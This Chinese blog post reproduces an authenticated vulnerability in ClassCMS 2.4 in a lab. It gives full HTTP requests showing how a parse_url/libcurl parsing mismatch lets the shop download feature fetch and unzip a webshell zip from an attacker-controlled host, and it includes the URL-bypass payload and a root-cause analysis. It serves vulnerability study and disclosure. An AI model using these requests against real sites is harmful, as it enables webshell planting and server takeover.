# 原创
：  ClassCMS2.4漏洞复现

# ClassCMS2.4漏洞复现

## CMS源码在附件中

### 环境搭建

使用phpstudy2016搭建web环境，php版本为5.5<br/> 安装CMS<br/> 这里选择Mysql数据库进行安装

> 
用户名和密码都写默认的admin方便记忆<br/> 输入完成后点击安装


<br/> 点击安装

> 
CMS的安装过程中有个报错忽略就好，登录不进后台的话刷新一下页面


进入了ClassCMS的后台

### 任意文件下载漏洞复现

在后台访问应用商店<br/>  

<br/> 任意点击一个下载<br/>  

<br/> 进入下载页面后点击 下载 进行抓包<br/>  

<br/> 我们先放掉第一个包

```
POST /admin?do=shop:index&amp;ajax=1&amp;action=fileurl&amp;from=install HTTP/1.1

Host: 192.168.12.144

Content-Length: 47

Accept: application/json, text/javascript, */*; q=0.01

X-Requested-With: XMLHttpRequest

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Origin: http://192.168.12.144

Referer: http://192.168.12.144/admin?do=shop:index&amp;bread=%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3&amp;action=detail&amp;classhash=debugswitch

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Cookie: token_9a9fe8=e0c7aacedb82db0c1522667cbf0bc806; csrf_9a9fe8=b472e230

Connection: close



classhash=debugswitch&amp;version=1.0&amp;csrf=b472e230
```

然后修改第二个请求包

```
//第二个数据包



POST /admin666?do=shop:downloadClass&amp;ajax=1 HTTP/1.1

Host: classcms

Content-Length: 85

Accept: application/json, text/javascript, */*; q=0.01

X-Requested-With: XMLHttpRequest

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Origin: http://192.168.159.1

Referer: http://192.168.159.1/ClassCMS/admin666?do=shop:index&amp;bread=%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91&amp;action=detail&amp;classhash=classcreate

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Cookie: token_2ab421=5d012ca838cc5f0aff02c44c8e2c91e7; csrf_2ab421=338ceb00

Connection: close



classhash={dir}&amp;url=http://@{ip}:{port}@classcms.com/{shell.zip}&amp;csrf=b472e230
```

数据包参数解析

```
classhash为解压出来的最后文件名



url为了绕过过滤设成如下形式



http://@ip:80@classcms.com/shell.zip

远程ip端口（默认80也需要加上），一个包含木马文件（shell.php）的zip压缩包



csrf参数不动即可



发送之后返回:下载完成



就说明已经成功被下载到目标服务器上并解压



最后访问url即可执行上传上的木马getshell



http://ip/class/{classhash的值}/{上传压缩包中的木马文件}
```

我们安装上面的格式修改数据包上传一个木马文件

先在网站根目录创建一个木马文件，然后把他压缩成压缩包<br/>  

然后再重新构建第二个数据包​​​​​​​

```
//第二个数据包



POST /admin666?do=shop:downloadClass&amp;ajax=1 HTTP/1.1

Host: classcms

Content-Length: 85

Accept: application/json, text/javascript, */*; q=0.01

X-Requested-With: XMLHttpRequest

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Origin: http://192.168.159.1

Referer: http://192.168.159.1/ClassCMS/admin666?do=shop:index&amp;bread=%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91&amp;action=detail&amp;classhash=classcreate

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Cookie: token_2ab421=5d012ca838cc5f0aff02c44c8e2c91e7; csrf_2ab421=b472e230

Connection: close



classhash=shell&amp;url=http://@192.168.12.144:80@classcms.com/shell.zip&amp;csrf=338ceb00
```

上传之前创建的shell.zip<br/>`classhash=shell&amp;url=http://@192.168.12.144:80@classcms.com/shell.zip&amp;csrf=b472e230`<br/> 直接修改数据包后放包也可以<br/>  

<br/> 把修改后的数据包提交<br/>  

<br/> 提交成功

访问`http://192.168.12.144/class/shell/shell.php`<br/>  

<br/> 可以看到木马上传成功了，在本地也可以看到下载的shell.zip文件

### 漏洞成因

经白盒测试发现在/class/shop/shop.php中<br/> 通过全局搜索，“下载完成”定位到此处

<br/> 一处为在`downloadClass`函数中一处在`upgradeClass`函数中，观察功能显然是在`downloadClass`中<br/>  

<br/> 在`this(当前文件shop.php)-&gt;download`函数下,定位到关键函数`download`<br/>  

<br/>  

<br/> 函数首先获取了默认允许的`host`，在`this(前文件下)-&gt;defaultHost`函数中<br/> 定位函数defaultHost

---


<br/> 只允许 classcms.com;classcms.uuu.la<br/> 然后将我们传入的url (这里是`http://http://192.168.12.144/shell.zip`) 通过parse_url函数解析后在判断是否是在数组中<br/> 我们的攻击url也就是down在了这里，那么目标就是绕过这个判断然后执行接下来的curl命令​​​​​​​

```
if(!isset($checkurl['host']) || !in_array($checkurl['host'],$hosts)) {

Return false;

}
```

前一个条件存在是肯定满足的，那么只需要让经过parse_url解析过的host键值和数组相等即可

这里利用php中的parse_url函数和lib_curl对url的解析差异,导致了对host的过滤失效来进行绕过

php-curl拓展解析的url host在第首个@之后<br/> 而parse_url则是最后一个@之后<br/> 所以构造处payload

`http://@http://192.168.12.144:80@classcms.com/shell.zip`

**没看够~？欢迎关注！**
